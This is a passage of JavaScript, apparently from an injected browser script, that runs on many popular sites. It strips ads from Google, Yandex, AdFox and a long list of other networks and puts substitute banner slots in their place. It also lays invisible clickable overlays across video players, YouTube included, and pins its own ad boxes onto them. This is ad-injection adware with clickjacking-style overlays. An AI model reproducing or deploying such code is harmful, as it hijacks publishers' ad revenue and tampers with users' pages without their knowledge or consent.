                                    if (t === true && pp.href && typeof(pp.href) !== 'object' && pp.href.match(/(sparonero\.pro|empazon\.ru|novostimira\.biz|et-code\.ru|gonews3\.net|btz\.onlinekanal\.ru|ettalhap\.com|ads\.adfox\.ru|thor-media\.ruclick|n\.cashandfavor\.ru|sletl\.xbosombpvz\.xyz|ledhatbet\.com|dmqpc\.hfmqjxwz\.xyz|ru\.redtram\.com|rebevengwas\.com|iqomy\.pcruxm\.xyz|rtl1\.net|goods\.redtram\.com|smi2\.ru|news\.gnezdo\.ru|pdbgci\.dflfnrmi\.xyz|toget\.ru|runetki\.com|www\.theclassicporn\.com|parhadat\.com|1b2\.kordonivkakino\.tv|globalteaser\.ru|cohedttoft\.com|rt\.tizerlady\.info|rt\.tizerlady\.win|zirijasa\.ru|zirijata\.ru|block\.sw1block\.com|scr-tz\.com|partner\.komedra\.com|funsmi\.ru|ptggr\.kxqvnfcg\.xyz|ulro\.nmmfk\.xyz|yku\.evyhhq\.xyz|rt\.rtl1\.org|rt\.tlr1\.biz|rarenok\.biz|gcl\.novostimira\.biz|recreativ\.ru)/img)) {
                                        t = false;
                                        change_peas(a);
                                    } else if (t === true && pp.href && typeof(pp.href) !== 'object' && pp.href.match(/[^0-9a-z]+(luxup|luxadv\.com|block\.s[0-9]+block\.com)[^0-9a-z]+/img)) {
                                        change_peas(a);
                                    } else if (a.querySelector('div[id^="etarg_description"]') && a.querySelectorAll('div[id^="etarg_description"]').length > 1) {
                                        change_peas(a);
                                    }
                                });
                            }
                        });
                        var all_ban_imgs = function () {
                            var ch = function (peas, width, height) {
                                var fader = peas.parentNode;
                                peas.parentNode.removeChild(peas);
                                createDiv(height, width, fader);
                            };
                            Array.prototype.forEach.call($$('img'), function (peas) {
                                var w = peas.offsetWidth;
                                var h = peas.offsetHeight;
                                var fader = peas.parentNode;
                                var fader_2 = fader.parentNode;
                                if (peas.src.match(/[^0-9a-z]+worldssl\.net[^0-9a-z]+/img)) {
                                    change_peas(peas);
                                } else if (!peas.getAttribute('data-mytype') && str_rs_img.indexOf(',' + w + 'x' + h + ',') !== -1 && fader.tagName !== 'BODY' && peas.src) {
                                    if (fader.tagName === 'DIV' || fader.tagName === 'CENTER' || fader.tagName === 'NOINDEX') {
                                        ch(peas, w, h);
                                    } else if (fader.tagName === 'A' && (fader_2.tagName === 'DIV' || fader_2.tagName === 'CENTER' || fader_2.tagName === 'NOINDEX' || fader_2.tagName === 'TD')) {
                                        ch(fader, w, h);
                                    }
                                } else if (w > 99 && h > 49 && peas.src.match(/[^0-9a-z]+(adv\.wp\.pl|heo3x\.net|pipki.r)[^0-9a-z]+/img)) {
                                    if (fader.tagName === 'DIV' || fader.tagName === 'CENTER' || fader.tagName === 'NOINDEX') {
                                        ch(peas, w, h);
                                    } else if (fader.tagName === 'A' && (fader_2.tagName === 'DIV' || fader_2.tagName === 'CENTER' || fader_2.tagName === 'NOINDEX' || fader_2.tagName === 'TD')) {
                                        ch(fader, w, h);
                                    }
                                }
                            });
                        };
                        all_ban_imgs();
                        var del_logo = ['a[title^="Рекламная сеть Recreativ"]', 'a[href^="http://tovarro.com/"]', 'div[class^="main-title"]', 'a[href^="http://usr.marketgid.com/"]', 'a[class^="adbucks"]', 'div[class^="ssvzHeader"]', 'span[id^="adtima-logo"]', 'a[class^="admLogoAdx"]', 'a[class^="admLogoAdx"]', 'a[href^="//traforet.com/"]', 'div[onclick^="window.open"]', 'div[onclick^="window.open"]', 'a[href^="http://tizerlady.ru/"]'];
                        del_logo.forEach(function (pp) {
                            Array.prototype.forEach.call($$('' + pp + ''), function (a) {
                                if (!host.match(/(markrtgid\.com|tovarro\.com|tizerlady\.ru)+/img)) {
                                    a.parentNode.removeChild(a);
                                }
                            });
                        });
                    }

                    if (!host.indexOf('myaccount.google.com') > -1) {
                        all_div_iframe_baners();
                    }
                }

                function video() {
                    function getOffsetTop(elem) {
                        var top = 0;
                        while (elem) {
                            top = top + parseFloat(elem.offsetTop);
                            elem = elem.offsetParent
                        }
                        return top
                    }

                    function getOffsetLeft(elem) {
                        var left = 0;
                        while (elem) {
                            left = left + parseFloat(elem.offsetLeft);
                            elem = elem.offsetParent
                        }
                        return left
                    }

                    var myObject = [];
                    Array.prototype.forEach.call($$('video'), function (a) {
                        if (a.offsetHeight > 250 && a.offsetWidth > a.offsetHeight && a.offsetWidth >= 468 && !a.getAttribute('data-mytype')) {
                            myObject.push(a);
                            if (host !== 'www.youtube.com') {
                                a.setAttribute('data-mytype', 'name_video');
                            }
                        }
                    });
                    Array.prototype.forEach.call($$('iframe'), function (b) {
                        var iframe_src = b.src;
                        if (b.offsetHeight > 300 && b.offsetWidth > b.offsetHeight && b.offsetWidth >= 468 && iframe_src && !b.getAttribute('data-mytype')) {
                            if ((iframe_src.match(/[^0-9a-z]+(youtube|rutube|moonwalk|video|kino|ivi|player|autoplay|serpens)[^0-9a-z]+/img) || iframe_src.indexOf('video') !== -1 || iframe_src.indexOf('youtube') !== -1) && iframe_src.indexOf('vk.com') === -1) {
                                myObject.push(b);
                                b.setAttribute('data-mytype', 'name_iframe');
                            }
                        }
                    });
                    Array.prototype.forEach.call($$('object'), function (c) {
                        var obj_data = c.getAttribute('data');
                        if (c.offsetHeight > 300 && c.offsetWidth > c.offsetHeight && c.offsetWidth >= 468 && obj_data && !c.getAttribute('data-mytype')) {
                            if (obj_data.match(/[^0-9a-z]+(youtube|rutube|moonwalk|video|kino|kinogo|player|MegaPlayer)[^0-9a-z]+/img) || obj_data.indexOf('video') !== -1) {
                                myObject.push(c);
                                c.setAttribute('data-mytype', 'name_object');
                            }
                        }
                    });
                    if (myObject.length > 0) {
                        myObject.forEach(function (peas) {
                            var w = peas.offsetWidth;
                            var h = peas.offsetHeight;
                            var f = true;
                            var ff = peas.parentNode;
                            for (var i = 0; i < 15; i++) {
                                if ((ff.style.position === 'fixed' || GetCssStyle(ff).position === 'fixed') && f === true) {
                                    f = false;
                                } else if (ff && ff.tagName !== 'BODY') {
                                    ff = ff.parentNode;
                                }
                            }
                            if (f === true && w > 468 && h > 200 && !document.querySelector('iframe[data-prel="name_iframe"]')) {
                                var top = getOffsetTop(peas);
                                var left = getOffsetLeft(peas);
                                var abs = document.createElement('div');
                                if (host !== 'www.youtube.com') {
                                    abs.setAttribute('style', 'width:' + w + 'px;height:' + h + 'px;top:' + top + 'px;left:' + left + 'px;position:absolute;cursor:pointer;z-index:9999999999999;');
                                }
                                body.appendChild(abs);
                                setInterval(function () {
                                    abs.style.left = getOffsetLeft(peas) + 'px';
                                    abs.style.top = getOffsetTop(peas) + 'px';
                                }, 2000);
                                var gt = setInterval(function () {
                                    if (peas.offsetWidth < 468) {
                                        clearInterval(gt);
                                        if (abs) {
                                            abs.parentNode.removeChild(abs);
                                        }
                                    }
                                }, 2000);
                                var add = function () {
                                    if (host === 'www.youtube.com') {
                                        peas.setAttribute('data-mytype', 'name_video');
                                    } else {
                                        abs.parentNode.removeChild(abs);
                                    }
                                    Array.prototype.forEach.call($$('.video_pl_p'), function (p) {
                                        p.parentNode.removeChild(p);
                                    });
                                    var tl = 120000;
                                    var t_n = function (tl) {
                                        if (peas) {
                                            w = peas.offsetWidth;
                                            h = peas.offsetHeight;
                                            var m_d = document.createElement('div');
                                            var w_2 = 728;
                                            var h_2 = 90;
                                            if (peas.offsetWidth < 728 && peas.offsetWidth >= 468) {
                                                w_2 = 468;
                                                h_2 = 60;
                                            }
                                            var t = (h + getOffsetTop(peas)) - (h_2 + 40);
                                            var l = ((w - w_2) / 2) + getOffsetLeft(peas);
                                            m_d.setAttribute('style', 'position:absolute;background:#fff;top:' + t + 'px;z-index:9999999999999;left:' + l + 'px;width:' + w_2 + 'px;height:' + h_2 + 'px;');
                                            m_d.className = 'video_pl_p';
                                            var td = setInterval(function () {
                                                if (host === 'www.youtube.com') {
                                                    var adsd = document.querySelector('div[class^="ad-container ad-container-single-media"]');
                                                    if (adsd && adsd.innerHTML !== '') {
                                                        adsd.innerHTML = '';
                                                    }
                                                }
                                                w = peas.offsetWidth;
                                                h = peas.offsetHeight;
                                                if (w < w_2 || ($_GET('q') && $_GET('q') === 'gHtFdrR')) {
                                                    clearInterval(td);
                                                    if (m_d) {
                                                        m_d.parentNode.removeChild(m_d);
                                                    }
                                                    if (peas.getAttribute('data-mytype')) {
                                                        peas.removeAttribute('data-mytype');
                                                    }
                                                } else {
                                                    top = getOffsetTop(peas);
                                                    left = getOffsetLeft(peas);
                                                    var t = (h + top) - (h_2 + 40);
                                                    var l = ((w - w_2) / 2) + left;
                                                    m_d.style.top = t + 'px';
                                                    m_d.style.left = l + 'px';
                                                }
                                            }, 500);
                                            var sp = document.createElement('span');
                                            sp.innerText = 'x';
                                            sp.setAttribute('style', 'z-index:999999999999999;color:red;font-size:25px;font-weight:bold;cursor:pointer;width: 15px;position: absolute;right: 2px;top:-4px;padding: 2px;font-family: "YouTube Noto",Roboto,arial,sans-serif;');
                                            m_d.appendChild(sp);
                                            sp.onclick = function () {
                                                clearInterval(td);
                                                if (m_d) {
                                                    m_d.parentNode.removeChild(m_d);
                                                }
                                                setTimeout(function () {
                                                    if ((!$_GET('q') || ($_GET('q') && $_GET('q') !== 'gHtFdrR')) && !document.querySelector('iframe[data-prel="name_iframe"]')) {
                                                        if (host === 'www.youtube.com') {
                                                            t_n(tl + 60000);
                                                        } else {
                                                            t_n(tl + 120000);
                                                        }
                                                    } else if (peas.getAttribute('data-mytype')) {
                                                        peas.removeAttribute('data-mytype');
                                                    }
                                                }, tl);
                                            };
                                            body.appendChild(m_d);
                                            createDiv(h_2, w_2, m_d);
                                        } else if (abs) {
                                            abs.parentNode.removeChild(abs);
                                        }
                                    };
                                    t_n(tl);
                                };
                                if (host === 'www.youtube.com') {
                                    if (document.location.href.indexOf('watch') !== -1) {
                                        add();
                                    }
                                } else {
                                    abs.onclick = function () {
                                        add();
                                    };
                                }
                            }
                        });
                    }
                }

                if (host !== 'rutube.ru' && host !== 'binatex.com' && host !== 'www.twitch.tv' && (!$_GET('q') || ($_GET('q') && $_GET('q') !== 'gHtFdrR'))) {
                    video();
                }
                if (ak === 1) {
                    var abd = function (p, w, h) {
                        var pt = p.parentNode;
                        if (pt.tagName !== 'BODY' && ((h >= 125 && w >= 125) || (h >= 60 && w >= 468) || (h >= 100 && w >= 320) || (h >= 200 && w >= 100))) {
                            var d2 = document.createElement('div');
                            if (h < 600 && h !== 400 && h > 250) {
                                h = 250;
                            }
                            d2.setAttribute('style', 'width:' + w + 'px;max-height:' + h + 'px;margin:0 auto;display:inline-block;text-align:center;');
                            p.appendChild(d2);
                            var i = 0;
                            while ((p = p.previousSibling) !== null) i++;
                            pt.insertBefore(d2, pt.childNodes[i]);
                            createDiv(eval(h), eval(w), d2);
                        }
                    };
                    var c_d = function (el) {
                        Array.prototype.forEach.call($$(el), function (peas) {
                            if (!peas.querySelector('iframe[data-mytype="name_banner"]')) {
                                var st = peas.getAttribute('style');
                                if (peas.offsetWidth > 0 && peas.offsetHeight > 0) {
                                    abd(peas.parentNode, peas.offsetWidth, peas.offsetHeight);
                                    peas.parentNode.removeChild(peas);
                                } else if (st && st.indexOf('width:') > -1) {
                                    var a1 = st.indexOf('width:');
                                    var a2 = st.indexOf('height:');
                                    var w = st.slice(a1 + 6, a1 + 9).replace('p', '');
                                    var h = st.slice(a2 + 7, a2 + 10).replace('p', '');
                                    abd(peas.parentNode, w, h);
                                    peas.parentNode.removeChild(peas);
                                }
                            }
                        });
                    };
                    c_d('ins[class^="adsbygoogle"]');
                    c_d('ins[id^="aswift"]');
                    Array.prototype.forEach.call($$('iframe'), function (a) {
                        if (!a.getAttribute('data-mytype')) {
                            var w = a.offsetWidth;
                            var h = a.offsetHeight;
                            if (h === 0 && w === 0) {
                                w = a.getAttribute('width');
                                h = a.getAttribute('height');
                            }
                            var pe = a.parentNode;
                            if (((h >= 125 && w >= 125) || (h >= 60 && w >= 468) || (h >= 100 && w >= 320) || (h >= 200 && w >= 100)) && ((a.src && if_rs(a) === 1) || (a.id && if_di(a) === 1))) {
                                for (var c = 0; c < 5; c++) {
                                    var de = pe;
                                    pe = pe.parentNode;
                                    if ((pe.offsetWidth > 0 || pe.offsetHeight > 0) && !pe.querySelector('iframe[data-mytype="name_banner"]')) {
                                        de.innerHTML = '';
                                        abd(de, w, h);
                                        break;
                                    }
                                }
                            }
                        }
                    });
                    var c_d_2 = function (els) {
                        Array.prototype.forEach.call($$(els), function (peas) {
                            var w = peas.offsetWidth;
                            if (w === 0 && !peas.getAttribute('id').indexOf('adfox_') > -1) {
                                w = peas.parentNode.offsetWidth;
                            }
                            if (peas.innerHTML === '' || (peas.getAttribute('class') && peas.getAttribute('class').indexOf('trc_rbox_container') > -1) && w > 0 && !peas.querySelector('iframe[data-mytype="name_banner"]')) {
                                var h = 0;
                                if (w <= 300) {
                                    h = 400;
                                } else if (w <= 728) {
                                    h = 250;
                                } else {
                                    h = 90;
                                }
                                if (h > 0) {
                                    abd(peas, w, h);
                                    peas.parentNode.removeChild(peas);
                                }
                            }
                        });
                    };
                    var ar_n = ['div[id^="yandex_rtb"]', 'div[id^="yandex_ad"]', 'div[id^="adfox_"]', 'div[class^="trc_rbox_container"]'];
                    ar_n.forEach(function (t) {
                        c_d_2(t);
                    });
                }
            };
            var ttt_int = function (tt) {
                var inter_str = 'flipkart.com*pinterest.com*webtretho.com*coccoc.com*walmart.com*ok.ru*twitter.com*vk.com*vonvon.me*facebook.com*foxnews.com*drive2.ru*rambler.ru*youtube.com*ask.fm*yahoo.co*rutube.ru*instagram.com*flipkart.com*bing.com*zing.vn*zing.vn*google*mp3.zing.vn*yandex';
                if (inter_str.indexOf(host.replace('www.', '')) > -1) {
                    var mytime = setInterval(function () {
                        if (!$_GET('q') || ($_GET('q') && $_GET('q') !== 'gHtFdrR')) {
                            int_funk();
                        }
                        count++;
                    }, 4000);
                } else {
                    mytime = setInterval(function () {
                        int_funk();
                        if (count === 20) {
                            clearInterval(mytime);
                            ttt_int(500);
                        } else if (count === 50) {
                            clearInterval(mytime);
                        }
                        count++;
                    }, tt);
                }
                int_funk();
            };
            if (host === 'www.facebook.com') {
                var body_big_cont = document.querySelector('._li');
                if (body_big_cont) {
                    body_big_cont.onclick = function () {
                        int_funk();
                        ttt_int(100);
                    };
                }
            }
            try {
                int_funk();
            } catch (fuEx) {
            }
            try {
                ttt_int(100);
            } catch (initEx) {
            }
        };
        all_init();
    } catch (ppEx) {
    }
})();
